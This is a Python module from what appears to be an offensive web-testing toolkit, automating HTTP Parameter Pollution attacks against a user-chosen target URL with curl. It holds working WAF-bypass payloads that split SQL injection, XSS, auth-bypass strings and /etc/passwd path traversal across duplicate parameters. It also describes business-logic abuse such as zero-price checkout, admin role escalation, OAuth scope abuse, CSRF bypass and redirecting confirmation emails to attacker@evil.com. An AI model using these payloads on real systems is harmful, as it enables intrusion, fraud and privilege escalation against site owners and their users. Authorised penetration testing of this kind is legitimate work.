"""
modules/http_parameter_pollution.py
tmrswrr - HTTP Parameter Pollution (HPP)
WAF bypass, business logic abuse, server-side HPP, client-side HPP
"""
import os
import re
import urllib.parse

from config.settings import OUTPUT_DIR, SESSION, add_vuln, save_session
from utils.helpers import (
    DIM,
    NEON_CYN,
    NEON_GRN,
    NEON_YEL,
    PURE_WHITE,
    RST,
    SOFT_WHITE,
    info,
    print_banner,
    prompt,
    run_cmd,
    section,
    success,
    warn,
)


def _out(name):
    d = str(OUTPUT_DIR); os.makedirs(d, exist_ok=True)
    return os.path.join(d, name)


def _target():
    url = SESSION.get("target_url", "")
    if not url:
        url = prompt("Target URL"); SESSION["target_url"] = url
    return url


def server_side_hpp():
    section("SERVER-SIDE HTTP PARAMETER POLLUTION")
    url = _target()
    cookies = SESSION.get("cookies", "")
    cookie_flag = f'-H "Cookie: {cookies}"' if cookies else ""

    info("Testing how server handles duplicate parameters...")
    param = prompt("Parameter to test (e.g. id, user, role, amount)")
    if not param:
        param = "id"

    # Different server behavior with duplicate params:
    # PHP/Apache:  last value wins (id=1&id=2 → id=2)
    # ASP.NET:     all values joined (id=1,2)
    # Django/Flask: first value wins
    # Node.js:      last value or array
    # Rails:        last value

    val1 = "legitimate"
    val2 = "injected"
    canary = "hpp-canary-12345"

    test_cases = [
        (f"?{param}={val1}&{param}={val2}",         "Duplicate GET"),
        (f"?{param}={val1}&{param.upper()}={val2}", "Case variation"),
        (f"?{param}[]={val1}&{param}[]={val2}",     "Array notation"),
        (f"?{param}={val1}&{param}={canary}",       "Canary injection"),
        (f"?{param}={val1};{val2}",                 "Semicolon separated"),
        (f"?{param}={val1},{val2}",                 "Comma separated"),
        (f"?{param}={urllib.parse.quote(val1)}&{param}={urllib.parse.quote(val2)}", "URL encoded dupe"),
    ]

    print()
    for query, desc in test_cases:
        test_url = f"{url}{query}"
        out, _, _ = run_cmd(f'curl -sk {cookie_flag} "{test_url}" -m 8')
        # Check which value is reflected
        if canary in out:
            success(f"HPP - {desc}: second value ({val2}) reflected! ({canary})")
            add_vuln("HTTP Parameter Pollution (Server-side)", "Medium", "A05:2021",
                     f"Duplicate param {param} - server uses injected value", url)
        elif val2 in out and val1 in out:
            info(f"HPP - {desc}: BOTH values in response (array/join behavior)")
        elif val2 in out:
            warn(f"HPP - {desc}: injected value ({val2}) wins")
        elif val1 in out:
            print(f"  {DIM}[OK] {desc}: first value wins{RST}")
        else:
            print(f"  {DIM}[-] {desc}: no reflection{RST}")


def waf_bypass_hpp():
    section("WAF BYPASS VIA HTTP PARAMETER POLLUTION")
    url = _target()
    cookies = SESSION.get("cookies", "")
    cookie_flag = f'-H "Cookie: {cookies}"' if cookies else ""

    info("Using HPP to split malicious payloads across parameters...")
    param = prompt("Vulnerable parameter")
    if not param:
        return

    # Split SQLi payload across duplicate params
    # WAF inspects each param individually - neither triggers signature
    sqli_split = [
        (f"?{param}=1' UNION&{param}= SELECT 1,2,3--",    "SQLi split"),
        (f"?{param}=<scri&{param}=pt>alert(1)</script>",  "XSS split"),
        (f"?{param}=../..&{param}=/../etc/passwd",         "Path traversal split"),
        (f"?{param}=OR 1&{param}==1--",                    "SQLi split #2"),
        (f"?{param}=' OR&{param}='1'='1",                  "Auth bypass split"),
    ]

    print()
    for query, desc in sqli_split:
        test_url = f"{url}{query}"
        out, _, _ = run_cmd(f'curl -sk {cookie_flag} "{test_url}" -m 8')
        blocked = any(x in out.lower() for x in
                      ["blocked", "waf", "firewall", "forbidden", "403"])
        if blocked:
            print(f"  {DIM}[BLOCKED] {desc}{RST}")
        else:
            indicators = ["sql", "error", "union", "select", "alert", "root:"]
            if any(i in out.lower() for i in indicators):
                success(f"WAF BYPASS + PAYLOAD REFLECTED: {desc}")
                add_vuln("WAF Bypass via HPP", "High", "A03:2021",
                         f"Payload split bypassed WAF: {desc}", url)
            else:
                print(f"  {NEON_YEL}[PASS WAF?]{RST} {desc} - check response manually")
                print(f"  {DIM}Response: {out[:100]}{RST}")


def business_logic_hpp():
    section("BUSINESS LOGIC ABUSE VIA HPP")
    url = _target()
    cookies = SESSION.get("cookies", "")
    cookie_flag = f'-H "Cookie: {cookies}"' if cookies else ""

    print(f"""
  {NEON_CYN}Business Logic HPP Scenarios:{RST}

  {NEON_GRN}[1] Price Manipulation:{RST}
    POST /checkout
    amount=100&amount=0    → server uses last: pays $0
    amount=0&amount=100    → server uses first: pays $0

  {NEON_GRN}[2] Privilege Escalation:{RST}
    POST /register
    role=user&role=admin   → might register as admin

  {NEON_GRN}[3] OAuth scope abuse:{RST}
    GET /oauth/authorize?scope=read&scope=admin
    → might get admin scope if server uses last value

  {NEON_GRN}[4] CSRF token bypass:{RST}
    POST /transfer
    csrf=valid_token&csrf=invalid_token&amount=1000
    → if server validates first csrf but uses last, bypass fails
    csrf=invalid_token&csrf=valid_token
    → if server validates last csrf, bypass possible

  {NEON_GRN}[5] Email notification hijack:{RST}
    POST /subscribe?email=victim@target.com&email=attacker@evil.com
    → confirmation email sent to both, or only attacker
""")

    endpoint = prompt("Endpoint to test HPP business logic")
    if not endpoint:
        return

    param   = prompt("Parameter to duplicate (e.g. amount, role, scope)")
    val1    = prompt("Legitimate value (e.g. user, 100, read)")
    val2    = prompt("Malicious value (e.g. admin, 0, write)")
    if not all([param, val1, val2]):
        return

    import urllib.parse
    test_cases = [
        f"{urllib.parse.quote(param)}={urllib.parse.quote(val1)}&{urllib.parse.quote(param)}={urllib.parse.quote(val2)}",
        f"{urllib.parse.quote(param)}={urllib.parse.quote(val2)}&{urllib.parse.quote(param)}={urllib.parse.quote(val1)}",
    ]

    for data in test_cases:
        out, _, _ = run_cmd(
            f'curl -sk -X POST "{url}{endpoint}" '
            f'-H "Content-Type: application/x-www-form-urlencoded" '
            f'{cookie_flag} -d "{data}" -m 10'
        )
        print(f"\n  {NEON_CYN}Payload: {data}{RST}")
        print(f"  Response: {out[:200]}")
        if val2 in out and any(x in out.lower() for x in ["success", "ok", "true"]):
            warn(f"Malicious value '{val2}' accepted!")
            add_vuln("Business Logic HPP", "High", "A04:2021",
                     f"Duplicate {param}: malicious value '{val2}' used by server", url)


def client_side_hpp():
    section("CLIENT-SIDE HTTP PARAMETER POLLUTION")
    url = _target()
    info("Testing client-side parameter pollution via URL fragment + anchor manipulation...")

    print(f"""
  {NEON_CYN}Client-Side HPP - JavaScript URL construction:{RST}

  {NEON_GRN}Vulnerable JS pattern:{RST}
    var url = "http://api.example.com/user?id=" + userId;
    // Attacker controls userId = "1&admin=true"
    // Result: /user?id=1&admin=true

  {NEON_GRN}DOM-based HPP via location.search:{RST}
    var id = getParam('id');        // Gets "1&admin=true"
    var apiUrl = '/api?user=' + id; // Becomes /api?user=1&admin=true

  {NEON_GRN}Test with URL:{RST}
    {url}#id=1&admin=true
    {url}?callback=legit&callback=evil

  {NEON_CYN}Search the JavaScript for vulnerable patterns:{RST}
""")
    out, _, _ = run_cmd(f'curl -sk {url} -m 10')
    scripts = re.findall(r'src=["\']([^"\']+\.js[^"\']*)["\']', out, re.I)[:5]

    patterns = [
        r'location\.(search|hash)',
        r'URLSearchParams',
        r'getParameter',
        r'\?\s*\+\s*[a-zA-Z]',
        r'url\s*\+\s*["\']?\?',
        r'encodeURIComponent\s*\(',
    ]

    for script in scripts:
        if not script.startswith("http"):
            script = url.rstrip("/") + "/" + script.lstrip("/")
        js_content, _, _ = run_cmd(f'curl -sk "{script}" -m 10')
        for pat in patterns:
            if re.search(pat, js_content, re.I):
                warn(f"Client-side URL construction: {pat!r} in {script[-60:]}")


def run():
    print_banner("HTTP PARAMETER POLLUTION",
                 "WAF Bypass · Business Logic · Client-Side HPP")
    while True:
        url = SESSION.get("target_url", "-")
        print(f"""
  {NEON_GRN}Target:{RST} {PURE_WHITE}{url}{RST}

  {NEON_CYN}[1]{RST} Server-Side HPP     {SOFT_WHITE}(how server handles duplicate params){RST}
  {NEON_CYN}[2]{RST} WAF Bypass via HPP  {SOFT_WHITE}(split SQLi/XSS across params){RST}
  {NEON_CYN}[3]{RST} Business Logic HPP  {SOFT_WHITE}(price, role, scope manipulation){RST}
  {NEON_CYN}[4]{RST} Client-Side HPP     {SOFT_WHITE}(DOM-based URL construction){RST}
  {NEON_GRN}[0]{RST} Back to main menu
""")
        c = prompt("Choice")
        if c == "0": break
        elif c == "1": server_side_hpp()
        elif c == "2": waf_bypass_hpp()
        elif c == "3": business_logic_hpp()
        elif c == "4": client_side_hpp()
        save_session()
